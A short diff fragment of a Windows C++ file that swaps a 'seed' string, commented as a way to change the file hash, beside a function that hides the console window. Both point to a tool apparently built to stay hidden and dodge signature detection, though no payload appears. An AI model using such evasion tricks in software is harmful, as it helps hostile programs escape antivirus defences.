@@ -6,7 +6,7 @@
 #include <csignal>
 
 // NOTE: Change the seed to change the file hash.
-std::string seed = "This1s@genericpw";
+std::string seed = "k8c*R$i*c#ZtpCb$";
 
 void HideWindow() {
 	HWND hWindow = GetConsoleWindow();
